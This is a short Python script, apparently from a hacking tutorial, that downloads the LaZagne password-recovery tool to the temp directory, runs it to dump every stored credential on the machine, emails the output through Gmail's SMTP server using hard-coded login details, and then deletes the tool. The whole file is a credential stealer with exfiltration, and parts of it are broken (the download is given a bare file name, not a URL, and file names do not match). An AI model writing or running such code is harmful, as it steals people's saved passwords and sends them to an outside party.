#!/usr/bin/env python

import requests
import smtplib, os, tempfile
import subprocess


def download(url):
    get_response = requests.get(url)
    # method to access elements in a string
    file_name = url.split("/")[-1]
    with open(file_name, "wb")as out_file:
        out_file.write(get_response.content)


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
download("Lazagne.exe")

command = "laZagne.exe all"
result = subprocess.check_output(command, shell=True)
send_mail("johnwick@gmail.com", "123456789", result)
os.remove("laZagne.exe ")
